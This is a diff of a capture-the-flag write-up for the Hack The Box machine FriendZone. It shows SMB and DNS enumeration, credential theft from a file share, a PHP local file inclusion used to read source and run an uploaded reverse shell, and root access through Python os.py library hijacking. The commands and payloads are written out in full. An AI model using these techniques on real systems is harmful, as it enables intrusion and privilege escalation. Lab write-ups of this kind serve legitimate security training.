@@ -11,6 +11,7 @@ image:
 ---
 
 # Overview 
+
 This machine begins w/ a network enumeration w/ `nmap`, a domain name is enumerated `friendzone.red`, DNS enumeration w/ `dig` is carried out to enumerate subdomains. `uploads.friendzone.red` & `administrator1.friendzone.red`. 
 
 Next, there are 2 file share discovered, `Development` - `RW` access & `general` - `R` access. Credentials can be exfiltrated from `general` fileshare, revealing credentials for a login page in `administrator1.friendzone.red`. 
@@ -25,31 +26,34 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 
 ---
 
-| Column       | Details      |
-| ------------ | ------------ |
-| Box Name     | FriendZone   |
-| IP           | 10.10.10.123 |
-| Points       | -            |
-| Difficulty   | Easy         |
-| Creator      |  [askar](https://www.hackthebox.com/home/users/profile/17292)             |
-| Release Date | 09-Feb-2019  |
-
+| Column       | Details                                                      |
+|--------------|--------------------------------------------------------------|
+| Box Name     | FriendZone                                                   |
+| IP           | 10.10.10.123                                                 |
+| Points       | -                                                            |
+| Difficulty   | Easy                                                         |
+| Creator      | [askar](https://www.hackthebox.com/home/users/profile/17292) |
+| Release Date | 09-Feb-2019                                                  |
 
 # Recon
 
 ## TCP/80 (HTTP)
+
 - FFUF
+
 ```
 200      GET        1l        2w       13c http://10.10.10.123/robots.txt
 403      GET       11l       32w      300c http://10.10.10.123/server-status
 301      GET        9l       28w      316c http://10.10.10.123/wordpress => http://10.10.10.123/wordpress/
 ```
+
 - `robots.txt`
 - `wordpress`
 
-
 ## TCP/139, 445 (SMB)
+
 - SMBMap
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb]
 	└─# smbmap -H friendzone.htb
@@ -62,22 +66,28 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	 Development   READ, WRITE     FriendZone Samba Server Files
 	 IPC$          NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
 	```
+
 	- `general` - `R`
 	- `Development` - `RW`
 
 ## TCP/443 (HTTPS)
+
 - NMAP
+
 	```
 	PORT    STATE SERVICE  REASON         VERSION
 	443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.29
 	| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
 	| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/localityName=AMMAN/emailAddress=haha@friendzone.red/organizationalUnitName=CODERED
 	```
+
 	- Subdomain
 		- `friendzone.red`
 
 ## TCP/UDP/53 (DNS)
+
 - DIG - Zone Transfer
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone]
 	└─# dig axfr @10.10.10.123 friendzone.red
@@ -98,6 +108,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	;; WHEN: Sun Sep 11 16:11:47 +08 2022
 	;; XFR size: 8 records (messages 1, bytes 289)
 	```
+
 	- Subdomains
 		- `administrator1.friendzone.red`
 		- `hr.friendzone.red`
@@ -105,9 +116,10 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 
 # Initial Foothold
 
-
 ## TCP/139, 445 (SMB) - File Exfiltration
+
 1. Download all files from `general` & `Development` SMB fileshare
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/general]
 	└─# smbclient //friendzone.htb/general -c 'prompt;recurse;mget *'
@@ -125,26 +137,30 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	Password for [WORKGROUP\root]:
 	# No files for Development
 	```
+
 	- `admin:WORKWORKHhallelujah@#`
 
-
 ## TCP/443 (HTTP) - Enumerating friendzone.red
+
 1. In the page source of index, saw something interesting
+
 	```
 	<!-- Just doing some development here -->
 	<!-- /js/js -->
 	<!-- Don't go deep ;) -->
 	```
+
 2. Proceed to `/js/js`
 	![](Pasted%20image%2020220911173351.png)
 	- Random `base64` encoded characters is displayed
 3. Tried to enumerate some `GET` parameters, nothing interesting is found
 4. Based on that, I think it is a rabbit-hole.
 
-
 ## TCP/443 (HTTP) - Enumerating uploads.friendzone.red
+
 1.  Directory enumerate the `uploads.friendzone.red`
 	-  `uploads.friendzone.red.`
+
 		```
 		┌──(root💀kali)-[~/htb/friendzone]
 		└─# ffuf -u https://uploads.friendzone.red/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.php,.txt'
@@ -152,18 +168,18 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		files                   [Status: 301, Size: 334, Words: 20, Lines: 10]
 		upload.php              [Status: 200, Size: 38, Words: 8, Lines: 1]
 		```
+
 		- `files` 
 			- Files uploaded by `upload.php` does not end up here 
 			- OR the uploaded files are renamed
 2. Attempt to upload a file, regardless of whatever the file is, even if nothing is uploaded, it says successfully uploaded.
 3. Based on that, I think it is a rabbit-hole.
 
-
-
-
 ## TCP/443 (HTTP) - Enumerating administrator1.friendzone.red
+
 1. Directory enumerate the `administrator1.friendzone.red`
 	- `administrator1.friendzone.red`
+
 		```
 		┌──(root💀kali)-[~/htb/friendzone]
 		└─# ffuf -u https://administrator1.friendzone.red/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.php,.txt'
@@ -177,6 +193,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		server-status           [Status: 403, Size: 318, Words: 22, Lines: 12]
 		:: Progress: [442314/661638] :: Job [1/1] :: 1106 req/sec :: Duration: [0:06:54] :: Errors: 0 ::
 		```
+
 		- `images` 
 			- Contains 2 `.jpg` images, used in `dashboard.php`
 		- `timestamp.php`
@@ -184,27 +201,35 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 2. Proceed to `administrator1.friendzone.red` & login w/ `admin:WORKWORKHhallelujah@#`
 	![](Pasted%20image%2020220911161807.png)
 3. Proceed to `/dashboard.php`
+
 	```
 	image_id=a.jpg&pagename=timestamp
 	```
+
 	![](Pasted%20image%2020220911172320.png)
+
 	- `timestamp` - earlier we enumerated it, the webpage is including `timestamp.php`
 4. Enumerating `GET` parameters
 	- `image_id`
 		- Able to display images from `/image` directory
 		- Enumerated it against `LFI` & `Command Injection` payloads, nothing is displayed, this is because the webpage is coded to only display images.
+
 			```
 			# Hypothesis
 			<center><img src='images/$_GET['image_id']'></center>
 			```
+
 	- `pagename`
 		- Based on how the webpage included `timestamp`, we are able to assume that `.php` is appended before the file is included.
+
 			```
 			# Hypothesis
 			include $_GET[pagename] . '.php'
 			```
+
 5. We are able to view the source code of the webpage by "exploiting" `GET` parameter `pagename` by base64 encoding it
 	- `timestamp.php`
+
 		```
 		┌──(root💀kali)-[~/htb/friendzone]
 		└─# curl -ks -H "Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100" 'https://administrator1.friendzone.red/dashboard.php?image_id=test&pagename=php://filter/convert.base64-encode/resource=timestamp' | cut -d '>' -f21 | base64 -d
@@ -218,8 +243,10 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		
 		?>
 		```
+
 		- Nothing interesting
 	- `dashboard.php`
+
 		```
 		┌──(root💀kali)-[~/htb/friendzone]
 		└─# curl -ks -H "Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100" 'https://administrator1.friendzone.red/dashboard.php?image_id=test&pagename=php://filter/convert.base64-encode/resource=dashboard' | cut -d '>' -f21 | base64 -d
@@ -254,14 +281,15 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		}
 		?>
 		```
+
 		- Based on this, we are able to do directory traversal and include a file w/ `.php` extension
 6. We are able to spawn a shell if we are able to somehow upload a `php-reverse-shell.php`.
 7. Earlier, while enumerating `TCP/139,445 (SMB)`, there is a fileshare `Development` that we have `RW` access to it
 
-
-
 ## TCP/139, 445 (SMB) - Upload php-reverse-shell.php
+
 1. Upload a `php-reverse-shell.php`
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb/development]                                                                                                        
 	└─# smbclient //friendzone.htb/Development                                                                                                                                  
@@ -276,7 +304,9 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	                                                                                                                                                                            
 	                9221460 blocks of size 1024. 6214168 blocks available     
 	```
+
 2. The comment of `Files` fileshare is **key** to uncovering the FULL PATH of `Development` fileshare on the system
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot/smb]
 	└─# smbmap -H friendzone.htb
@@ -289,10 +319,13 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	 Development   READ, WRITE     FriendZone Samba Server Files
 	 IPC$          NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
 	```
+
 	- We can assume that `Development` fileshare resides in `/etc/Development`
 
 ## TCP/443 (HTTPS) - Execute reverse shell
+
 1. Start a listener
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot]
 	└─# nc -nvlp 4444
@@ -300,14 +333,18 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	Ncat: Listening on :::4444
 	Ncat: Listening on 0.0.0.0:4444
 	```
+
 2. Execute our reverse shell
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone]
 	└─# curl -ks -H "Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100" 'https://administrator1.friendzone.red/dashboard.php?image_id=test&pagename=../../../../../etc/Development/php-reverse-shell'
 	```
+
 3. `www-data` shell obtained
 	![](Pasted%20image%2020220911183309.png)
 4. User Flag
+
 	```
 	www-data@FriendZone:/var/www$ cd /home
 	www-data@FriendZone:/home$ ls
@@ -319,7 +356,8 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	a9ed20acecd6c5b6b52f474e15ae9a11
 	www-data@FriendZone:/home/friend$ 
 	```
-1. Demo - LFI2RCE
+
+5. Demo - LFI2RCE
 	<html>
 	<head>
 	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
@@ -336,12 +374,12 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	</body>
 	</html>
 
-
-
 # Privilege Escalation
 
 ## Friend - Via File containing creds
+
 1. Found something interesting in `/var/www`
+
 	```
 	www-data@FriendZone:/var/www$ ls -l
 	total 28
@@ -364,20 +402,24 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	db_name=FZ
 	www-data@FriendZone:/var/www$ 
 	```
+
 	- `friend:Agpyu12!0.213$`
 2. SSH w/ `friend:Agpyu12!0.213$`
+
 	```
 	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot]
 	└─# sshpass -p 'Agpyu12!0.213$' ssh friend@friendzone.htb
 	```
+
 	![](Pasted%20image%2020220911184320.png)
 
-
 ## Root - Via Python Library Hijacking
+
 1. Found something interesting w/ `linpeas.sh`
 	![](Pasted%20image%2020220911203348.png)
 	- `server_admin`
 2. View files in `server_admin` directory
+
 	```
 	friend@FriendZone:/tmp$ ls -la /opt/server_admin/
 	total 12
@@ -385,11 +427,13 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	drwxr-xr-x 3 root root 4096 Oct  6  2018 ..
 	-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
 	```
+
 	- There should be a cronjob executing `reporter.py`
 3. Verify that there is a cronjob running w/ `pspy64`
 	![](Pasted%20image%2020220911222349.png)
 	- There is a cronjob executing `/opt/server_admin/reporter.py` as `root` every 2 minutes
 4. View contents of `/opt/server_admin/reporter.py`
+
 	```
 	friend@FriendZone:/tmp$ cat /opt/server_admin/reporter.py
 	#!/usr/bin/python
@@ -408,6 +452,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	# I need to edit the script later
 	# Sam ~ python developer
 	```
+
 	- We can potentially do `python` library hijacking
 5.  Exploiting `reporter.py`
 	- How do we exploit `reporter.py`
@@ -416,37 +461,51 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		- `rootbash` - `/bin/bash` w/ SUID bit set.
 
 	1. Check if library `os` writable
+
 		```
 		friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os                                                                                                                      
 		```
+
 		![](Pasted%20image%2020220911230640.png)
+
 		- `os.py` - `RWX`
 	2. Make a copy of `os.py` called `os_bak.py`
+
 		```
 		friend@FriendZone:/usr/lib/python2.7$ cp /usr/lib/python2.7/os.py /usr/lib/python2.7/os_bak.py                                                                                            
 		```
+
 		- We'll need this for writing our python script to create `rootbash`
 	3. Create our python script called `os.py` 
+
 		```
 		friend@FriendZone:/tmp$ cat os.py
 		import os_bak
 		os_bak.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
 		```
+
 	4. Replace `/usr/lib/python2.7/os.py` w/ `/tmp/os.py`
+
 		```
 		friend@FriendZone:/tmp$ cp /tmp/os.py /usr/lib/python2.7/os.py 
 		```
+
 	5. Wait for cronjob to execute, `rootbash` will be created
 	6. Obtain `root`
+
 		```
 		friend@FriendZone:/tmp$ /tmp/rootbash -p
 		```
+
 		![](Pasted%20image%2020220911231617.png)
+
 6. Root Flag
+
 	```
 	rootbash-4.4# cat root.txt 
 	b0e6c60b82cf96e9855ac1656a9e90c7
 	```
+
 7. Demo - Python Library Hijacking Privilege Escalation
 	<html>
 	<head>
@@ -464,5 +523,3 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	</body>
 	</html>
 	
-
-
